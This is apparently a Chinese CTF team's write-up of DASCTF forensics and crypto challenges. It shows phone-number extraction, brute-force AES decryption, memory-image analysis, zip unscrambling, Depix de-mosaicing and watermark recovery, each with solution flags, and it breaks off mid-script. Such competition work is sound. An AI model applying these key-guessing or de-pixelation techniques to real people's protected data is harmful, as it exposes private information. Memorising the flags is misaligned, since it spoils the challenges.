<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="ada902d88250c932c0c7daff2be53bfa">Zeropz-L组WP</h1>
<h2 data-content="1" id="e569bdfd97f41e2dd35fc701bec01053">DS</h2>
<h3 data-content="1" id="5b66d5ddd5033239f22e6642a5307e4d">ds-findphone</h3>
<pre><code>https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#ezmath-2</code></pre>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">csv</span>

<span class="n">tmp</span> <span class="o">=</span> <span class="p">[</span><span class="mi">734</span><span class="p">,</span> <span class="mi">735</span><span class="p">,</span> <span class="mi">736</span><span class="p">,</span> <span class="mi">737</span><span class="p">,</span> <span class="mi">738</span><span class="p">,</span> <span class="mi">739</span><span class="p">,</span> <span class="mi">747</span><span class="p">,</span> <span class="mi">748</span><span class="p">,</span> <span class="mi">750</span><span class="p">,</span> <span class="mi">751</span><span class="p">,</span> <span class="mi">752</span><span class="p">,</span> <span class="mi">757</span><span class="p">,</span> <span class="mi">758</span><span class="p">,</span> <span class="mi">759</span><span class="p">,</span> <span class="mi">772</span><span class="p">,</span> <span class="mi">778</span><span class="p">,</span> 
       <span class="mi">782</span><span class="p">,</span> <span class="mi">783</span><span class="p">,</span> <span class="mi">784</span><span class="p">,</span> <span class="mi">787</span><span class="p">,</span> <span class="mi">788</span><span class="p">,</span> <span class="mi">795</span><span class="p">,</span> <span class="mi">798</span><span class="p">,</span> <span class="mi">730</span><span class="p">,</span> <span class="mi">731</span><span class="p">,</span> <span class="mi">732</span><span class="p">,</span> <span class="mi">740</span><span class="p">,</span> <span class="mi">745</span><span class="p">,</span> <span class="mi">746</span><span class="p">,</span> <span class="mi">755</span><span class="p">,</span> <span class="mi">756</span><span class="p">,</span> <span class="mi">766</span><span class="p">,</span> 
       <span class="mi">767</span><span class="p">,</span> <span class="mi">771</span><span class="p">,</span> <span class="mi">775</span><span class="p">,</span> <span class="mi">776</span><span class="p">,</span> <span class="mi">785</span><span class="p">,</span> <span class="mi">786</span><span class="p">,</span> <span class="mi">796</span><span class="p">,</span> <span class="mi">733</span><span class="p">,</span> <span class="mi">749</span><span class="p">,</span> <span class="mi">753</span><span class="p">,</span> <span class="mi">773</span><span class="p">,</span> <span class="mi">774</span><span class="p">,</span> <span class="mi">777</span><span class="p">,</span> <span class="mi">780</span><span class="p">,</span> <span class="mi">781</span><span class="p">,</span> <span class="mi">789</span><span class="p">,</span> 
       <span class="mi">790</span><span class="p">,</span> <span class="mi">791</span><span class="p">,</span> <span class="mi">793</span><span class="p">,</span> <span class="mi">799</span><span class="p">]</span>

<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'output.csv'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s1">''</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span>
<span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
<span class="n">head</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'category'</span><span class="p">,</span><span class="s1">'value'</span><span class="p">]</span>
<span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
    <span class="n">t</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">t</span> <span class="o">+</span> <span class="sa">rb</span><span class="s1">'\d{8}'</span>
    <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">match</span> <span class="ow">in</span> <span class="n">matches</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">match</span><span class="p">)</span>
        <span class="n">message</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'phone'</span><span class="p">,</span><span class="n">match</span><span class="o">.</span><span class="n">decode</span><span class="p">()]</span>
        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</pre></div>
<p>&lt;font style="color:#FFFFFF;"&gt;····![]<br/>
(<a href="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212042-2ae01e66-ea22-4f8c-a692-" target="_blank">https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212042-2ae01e66-ea22-4f8c-a692-</a><br/>
ff65a9fe4e7c.png)&lt;/font&gt;</p>&lt;font style="color:#FFFFFF;"&gt;
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212219-87e3059f-d816-49ae-bd90-
0a85f18d71ad.png"/></p>
<p>DASCTF{37522664565224857214829962885285}</p>
<h2 data-content="1" id="637924af9a66092a594d2b2332a39ffc">MISC</h2>
<h3 data-content="1" id="e3988494e496dc6a25aa0ae9b923683c">特殊流量2</h3>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212385-bf20b81b-dc45-4354-8eef-522aa6df81fe.png"/></p>
<p>提出来一个文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212620-81075b01-4a21-4d72-966f-32536a0a6c03.png"/></p>
<p>-----BEGIN PUBLIC KEY-----<br/>
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx<br/>
PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ<br/>
5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J<br/>
RAcfJSQCvaw6O8uq3wIDAQAB<br/>
-----END PUBLIC KEY-----</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776212794-7c05afec-a08b-4c01-87a6-3696fad6b5e4.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776213094-16612e87-2f68-4d74-88a9-11fd934728cb.png"/></p>
<p>分析指令发现是把x替换成i或7</p>
<pre><code>xx34d619x1brxgd9mgd4xzxwxytv669w</code></pre>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>

<span class="c1"># 原始字符串</span>
<span class="n">original</span> <span class="o">=</span> <span class="s2">"xx34d619x1brxgd9mgd4xzxwxytv669w"</span>

<span class="c1"># 找到所有 'x' 的位置</span>
<span class="n">positions</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">original</span><span class="p">)</span> <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">'x'</span><span class="p">]</span>

<span class="c1"># 生成所有组合</span>
<span class="n">replacements</span> <span class="o">=</span> <span class="n">product</span><span class="p">(</span><span class="s1">'i7'</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">positions</span><span class="p">))</span>

<span class="c1"># 替换并生成所有可能字符串</span>
<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">replacements</span><span class="p">:</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">original</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">pos</span><span class="p">,</span> <span class="n">repl</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">positions</span><span class="p">,</span> <span class="n">combo</span><span class="p">):</span>
        <span class="n">temp</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">repl</span>
    <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>

<span class="c1"># 输出所有可能性</span>
<span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</pre></div>
<pre><code>ii34d619i1brigd9mgd4iziwiytv669w
ii34d619i1brigd9mgd4iziw7ytv669w
ii34d619i1brigd9mgd4iz7wiytv669w
ii34d619i1brigd9mgd4iz7w7ytv669w
ii34d619i1brigd9mgd47ziwiytv669w
ii34d619i1brigd9mgd47ziw7ytv669w
有两千多个就先写这么多吧</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776213394-8552e58a-725e-4254-adde-1414a2e04b9f.png"/></p>
<pre><code>U2FsdGVkX18tplkP51SopY26cczUyjuT8tP9j3Ofqv5XF5njA7CygY125iYhxplSQTNoT/kcwoN1z+4a4r/+9JtONfutcHXoyCv2tLseBHr802V/RRtFaZnZc3DM/trRmjk5SAyMSgvN+laSp6uK8eAOq7yKWq7FI+En5cu+j7+bxiuceviSoJ9gEw3SfEMtz4rYbKHagq8aCAlKPEevM+HVSnGSrMoy6QS8oQPgHkafdVj2m1HmfkdQFL5q7qYvrxVlRLbm657I0VIIusf8Q6+rsvlh28HrE3MzLlu6fd/cQ7nsZKuKYo0u4pc/yvI3RZglrd7Fb6piO4ryhs2g1g==</code></pre>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD5</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">derive_key_and_iv</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">key_length</span><span class="p">,</span> <span class="n">iv_length</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">d_i</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">key_length</span> <span class="o">+</span> <span class="n">iv_length</span><span class="p">:</span>
        <span class="n">d_i</span> <span class="o">=</span> <span class="n">MD5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">d_i</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">salt</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
        <span class="n">d</span> <span class="o">+=</span> <span class="n">d_i</span>
    <span class="k">return</span> <span class="n">d</span><span class="p">[:</span><span class="n">key_length</span><span class="p">],</span> <span class="n">d</span><span class="p">[</span><span class="n">key_length</span><span class="p">:</span><span class="n">key_length</span><span class="o">+</span><span class="n">iv_length</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">decrypt_openssl</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">!=</span> <span class="sa">b</span><span class="s2">"Salted__"</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">"Invalid OpenSSL-encrypted data"</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>
    <span class="n">key</span><span class="p">,</span> <span class="n">iv</span> <span class="o">=</span> <span class="n">derive_key_and_iv</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">),</span> <span class="n">salt</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
    <span class="n">padding_length</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">decrypted</span><span class="p">[:</span><span class="o">-</span><span class="n">padding_length</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">brute_force_decrypt</span><span class="p">(</span><span class="n">ciphertexts</span><span class="p">,</span> <span class="n">key_file</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">key_file</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">keys</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ciphertext</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertexts</span><span class="p">):</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Trying key: {key} on ciphertext {i+1}"</span><span class="p">)</span>
                <span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">decrypt_openssl</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Decryption successful!"</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">"Ciphertext index:"</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">"Correct key:"</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">"Decrypted text:"</span><span class="p">,</span> <span class="n">decrypted_text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
                <span class="k">return</span> <span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">decrypted_text</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Decryption failed, error message: {e}"</span><span class="p">)</span>
                <span class="k">pass</span>

    <span class="k">print</span><span class="p">(</span><span class="s2">"Decryption failed with all provided keys."</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>

<span class="n">ciphertexts</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s2">"U2FsdGVkX18tplkP51SopY26cczUyjuT8tP9j3Ofqv5XF5njA7CygY125iYhxplSQTNoT/kcwoN1z+4a4r/+9JtONfutcHXoyCv2tLseBHr802V/RRtFaZnZc3DM/trRmjk5SAyMSgvN+laSp6uK8eAOq7yKWq7FI+En5cu+j7+bxiuceviSoJ9gEw3SfEMtz4rYbKHagq8aCAlKPEevM+HVSnGSrMoy6QS8oQPgHkafdVj2m1HmfkdQFL5q7qYvrxVlRLbm657I0VIIusf8Q6+rsvlh28HrE3MzLlu6fd/cQ7nsZKuKYo0u4pc/yvI3RZglrd7Fb6piO4ryhs2g1g=="</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">key_file</span> <span class="o">=</span> <span class="s2">"./1.txt"</span>

<span class="n">index</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">decrypted_text</span> <span class="o">=</span> <span class="n">brute_force_decrypt</span><span class="p">(</span><span class="n">ciphertexts</span><span class="p">,</span> <span class="n">key_file</span><span class="p">)</span>
<span class="k">if</span> <span class="n">index</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Correct ciphertext index: {index+1}"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Correct key: {key}"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Decrypted text: {decrypted_text}"</span><span class="p">)</span>
</pre></div>
<p>最后得出密钥是</p>
<p>i734d619i1brigd9mgd4xz7w7ytv669w</p>
<p>解密结果</p>
<pre><code>Delta Alpha Sierra Charlie Tango Foxtrot Three Foxtrot Delta Three Four Bravo Five Nine Dash Four Echo Nine Delta Dash Four Three Nine Zero Dash Nine Two Seven Bravo Dash One Three Four Six Delta Five Three Six Four Delta Nine Nine</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776213628-b97fe4fd-19e5-4b12-9243-38efd3d178cc.png"/></p>
<p>D A S C T F 3 F D 3 4 B 5 9 - 4 E 9 D - 4 3 9 0 - 9 2 7 B - 1 3 4 6 D 5 3 6 4 D 9 9</p>
<h2 data-content="1" id="8596ff728402a127a0f1edc08984e1a9">马赛克</h2>
<p>imageinfo查看内存镜像信息</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776213902-b688eae2-0cfb-496e-a430-58b0d1e0acf5.png"/></p>
<p>Filescan发现桌面有flag.zip文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776214180-1be13b38-220f-4b0b-bd35-c0e298ce9b7c.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776214463-1b88c299-0db3-4b98-a0ec-df52ccc2ba01.png"/></p>
<p>导出之后，发现zip损坏</p>
<p>在editbox命令下，发现flag文件被打乱，下边是打乱的代码</p>
<p>简单分析原理后交给AI打磨逆向脚本：</p>
<div class="highlight"><pre><span></span><span class="n">recovered_f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'./new.zip'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">recovered_L</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">recovered_f</span><span class="p">)</span>
<span class="c1"># 计算原文件长度，根据原脚本逻辑，每轮循环取10字节（各5字节前后部分），这里通过取整判断循环次数反推原长度</span>
<span class="n">original_L</span> <span class="o">=</span> <span class="p">(</span><span class="n">recovered_L</span> <span class="o">//</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span>
<span class="c1"># 创建字节数组用于存放恢复后的原始文件内容</span>
<span class="n">original_data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">original_L</span><span class="p">)</span>
<span class="c1"># 循环次数根据计算出来的原文件长度对应的合理循环次数</span>
<span class="n">loop_count</span> <span class="o">=</span> <span class="n">original_L</span> <span class="o">//</span> <span class="mi">10</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">loop_count</span><span class="p">):</span>
    <span class="c1"># 提取原脚本中靠前写入的5个字节，放置到恢复内容的对应位置（5*i位置开始）</span>
    <span class="n">original_data</span><span class="p">[</span><span class="mi">5</span> <span class="o">*</span> <span class="n">i</span><span class="p">:</span> <span class="mi">5</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">recovered_f</span><span class="p">[</span><span class="mi">10</span> <span class="o">*</span> <span class="n">i</span><span class="p">:</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span>
    <span class="c1"># 提取原脚本中靠后写入的5个字节，放置到恢复内容的对应位置（从原文件末尾往前对应位置）</span>
    <span class="n">original_data</span><span class="p">[</span><span class="n">original_L</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">5</span><span class="p">:</span> <span class="n">original_L</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">recovered_f</span><span class="p">[</span><span class="mi">10</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">:</span> <span class="mi">10</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">10</span><span class="p">]</span>
<span class="k">if</span> <span class="n">recovered_L</span> <span class="o">%</span> <span class="mi">10</span><span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">remainder</span> <span class="o">=</span> <span class="n">recovered_L</span> <span class="o">%</span> <span class="mi">10</span>
    <span class="k">if</span> <span class="n">remainder</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">:</span>
        <span class="n">original_data</span><span class="p">[:</span><span class="n">remainder</span><span class="p">]</span> <span class="o">=</span> <span class="n">recovered_f</span><span class="p">[</span><span class="o">-</span><span class="n">remainder</span><span class="p">:]</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">original_data</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">recovered_f</span><span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">remainder</span><span class="p">):</span><span class="o">-</span><span class="p">(</span><span class="n">remainder</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)]</span>
<span class="n">original_data</span><span class="p">[</span><span class="n">original_L</span> <span class="o">-</span> <span class="p">(</span><span class="n">remainder</span> <span class="o">-</span> <span class="mi">5</span><span class="p">):</span><span class="n">original_L</span><span class="p">]</span> <span class="o">=</span> <span class="n">recovered_f</span><span class="p">[:(</span><span class="n">remainder</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)]</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'./recovered_flag.zip'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">recovered_file</span><span class="p">:</span>
    <span class="n">recovered_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">original_data</span><span class="p">)</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776214701-f8302b99-b6c7-4007-813d-2319b1587b12.png"/></p>
<p>恢复成功，还差个密码，继续在内存中找</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776214972-ca312543-adab-4cc1-a06f-8d1a7a2f84bc.png"/></p>
<p>Filescan命令，再图片文件夹里找到了个password，导出来</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776215158-22561fe3-9b0f-4058-b812-5110e517b4be.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776215439-df290c88-bf1a-4139-8221-2932e4d5937d.png"/></p>
<p>导出来发现是图片</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776215681-863ab725-df79-49e7-9d3c-53dc6cb5b26e.png"/></p>
<p>010查看，发现还有一个在尾部，foremost分离</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776215905-1fef67d4-9c3b-4e8e-aa30-7eb9c660f3d2.png"/></p>
<p>发现是flag.zip,用ai去马赛克</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776216176-7ed11f84-160f-4e16-b750-386dc7817e02.png"/></p>
<p>去除马赛克工具点击<a href="https://github.com/spipm/Depix" target="_blank">这里</a></p>
<p>解压后得到flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776216332-e63746bb-b1b4-4cb0-95ea-7b84cda920a8.png"/></p>
<p>REFTQ1RGe2RlYmVmMTBjLTA1YmItNGVhNy04ZDAxLWE1ZmRmMmEyNDZiN30-</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776216513-5497d5cc-f4ba-4e29-98a7-b0593d077a1d.png"/></p>
<p>DASCTF{debef10c-05bb-4ea7-8d01-a5fdf2a246b7}</p>
<h3 data-content="1" id="324c98d4041495de1a9f1032ed53297c">gza_Cracker</h3>
<p><a href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" target="_blank">https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776216792-b05d8ac4-8db4-47b5-9362-840c632df52c.png"/></p>
<p>DASCTF{M0Y_W1sh_Y0u_LogF1le_Usg32WEM}</p>
<h3 data-content="1" id="9a32dbe1df34554c40703973869f6c8b">不良劫</h3>
<p><a href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" target="_blank">https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA</a></p>
<p>foremost分离出残缺图片</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776217185-a965f09f-fbbd-41a4-b3f6-6f6a0c3b0134.png"/></p>
<p>ps手搓</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776217425-e38f2444-91cf-439c-9ad0-cb2e435ff25e.png"/></p>
<p>DASCTF{014c6e74-0c4a-48fa</p>
<p>盲水印</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776217616-470b5665-9f31-438f-ab6e-f6cfe752011a.png"/></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776217868-0a4b82ac-ee32-4c8c-9720-b49482f94ecc.png"/></p>
<p>DASCTF{014c6e74-0c4a-48fa-8b33-ced16f847e39}</p>
<h3 data-content="1" id="c49fc803d1c3effc3df970ccc8ab30d3">特殊流量</h3>
<h3 data-content="1" id="61eb1e1b5281b637c7591506d28a6dd8">PixMatrix</h3>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776218154-2317bf2e-f4c3-447b-84be-11f7347b28f5.png"/></p>
<p>把他看成两个4x4的矩阵，通过他的变换规则写出还原脚本</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>


<span class="k">def</span> <span class="nf">split_image_into_8x8_blocks</span><span class="p">(</span><span class="n">image_path</span><span class="p">):</span>
    <span class="c1"># 打开图片</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span>
    <span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">size</span>

    <span class="c1"># 初始化一个列表，用于存储所有的 8x8 矩阵</span>
    <span class="n">blocks</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="c1"># 遍历图片，按 8x8 的块分割</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">height</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>  <span class="c1"># 按行遍历</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>  <span class="c1"># 按列遍历</span>
            <span class="c1"># 裁剪当前的 8x8 块</span>
            <span class="n">block</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">crop</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">y</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
            <span class="n">blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>

